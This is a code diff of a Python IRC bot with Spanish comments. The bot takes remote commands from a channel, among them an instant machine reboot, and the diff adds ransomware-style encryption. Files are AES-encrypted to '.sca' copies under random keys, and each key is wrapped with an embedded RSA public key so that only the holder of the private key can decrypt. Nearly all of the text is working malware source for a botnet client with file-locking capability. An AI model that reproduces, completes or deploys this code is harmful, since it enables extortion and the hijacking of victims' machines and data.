@@ -1,57 +1,62 @@
-import socket
-import random, os
+import socket, random, os, string, Crypto
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
+from Crypto.PublicKey import RSA
+from Crypto import Random
 from subprocess import Popen, PIPE, CalledProcessError
  
 servidor = "192.168.1.30"
-canal = "#canal"
+canal = "#DianaOscar"
 nickName = ""
 puerto = 6667
 
 isAuth = False
 
+rsa_str = '-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDOsK/43W2J7yz+wrCj0iRtpfA40b6G5JVqEsfkrDrI84nKxJylc4+FelPKobnpHhWpmVX2UZFxeSEzfiUPaDZHRr+PtoyvAKoI9u9AGgXKdk811Ti84y5JsavCjsyOjHzBIvXTunwLNbGVP2P2X+KVULjC9tWe7bSMIC52XxzpIQIDAQAB\n-----END PUBLIC KEY-----'
+rsa = RSA.importKey(rsa_str)
 
 def Cifra(key, fnamec):
-      """
-      Recibe: La llave para cifrar el archivo y el nombre del archivo
-      Devuelve: Archivo cifrado usando AES como metodo de cifrado
-      """
-      chunksize=64*1024
-      outputfile=fnamec+'.ggez'
-      filesize=str(os.path.getsize(fnamec)).zfill(16)
-      IV=''
-      for i in range(16):
-            IV+=chr(random.randint(0,0xff))
-      encryptor= AES.new(key, AES.MODE_CBC,IV)
+	"""
+	Recibe: La llave para cifrar el archivo y el nombre del archivo
+	Devuelve: Archivo cifrado usando AES como metodo de cifrado
+	"""
+	chunksize=64*1024
+	outputfile=fnamec+'.sca'
+	filesize=str(os.path.getsize(fnamec)).zfill(16)
+	IV=''
+	llave_cifrada = CifraLlave(key)[0]
+	#print 'Logitud de la llave:',len(llave_cifrada)
+	for i in range(16):
+		IV+=chr(random.randint(0,0xff))
+	encryptor= AES.new(key, AES.MODE_CBC,IV)
 
-      try:
-        with open(fnamec, 'rb') as infile:
-                with open(outputfile, 'wb') as outfile:
-                    outfile.write(filesize)
-                    outfile.write(IV)
+	with open(fnamec, 'rb') as infile:
+		with open(outputfile, 'wb') as outfile:
+			outfile.write(filesize)
+			outfile.write(IV)
+			outfile.write(llave_cifrada)
 
-                    while True:
-                            chunk =infile.read(chunksize)
-                            if len(chunk)==0:
-                                break
-                            elif len(chunk) % 16 !=0:
-                                chunk+=' '*(16-(len(chunk)%16))
-                            outfile.write(encryptor.encrypt(chunk))
-					
-			        
-                    return "Cifrado exitoso."
-      except IOError:
-        return "Error de permisos"
+			while True:
+				chunk =infile.read(chunksize)
+				if len(chunk)==0:
+					break
+				elif len(chunk) % 16 !=0:
+					chunk+=' '*(16-(len(chunk)%16))
+				outfile.write(encryptor.encrypt(chunk))
 
 
 def CreaLlave(key):
-      """
-      Recibe: Un texto plano que servira ser una llave
-      Devuelve: Una llave de tamano constante la cual servira para cifrar el archivo
-      """
-      hasher=SHA256.new(key)
-      return hasher.digest()
+    """
+    Recibe: Un texto plano que servira ser una llave
+    Devuelve: Una llave de tamano constante la cual servira para cifrar el archivo
+    """
+    abcd = string.ascii_lowercase
+    k = ''.join(random.choice(abcd) for i in range(random.randint(16,64)))
+    hasher=SHA256.new(k)
+    return hasher.hexdigest()[:16]
+
+def CifraLlave(llave):
+	return rsa.encrypt(llave,32)
 
 def name_generator():
       cad= "abcdefghijklmnopqrstuvwxyz1234567890"
@@ -189,6 +194,8 @@ def do_command(irc, ircmsg):
         elif ircmsg.find("!@reboot") != -1 :
             send_msg(irc, "Regreso en un minuto, voy al banio :O")
             sub_stdout, sub_stderr = Popen(["shutdown", "/r", "/t", "0"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
+        elif ircmsg.find("PING") != -1 :
+	        send_msg(irc, canal, "PONG\n\r")
       
 
 
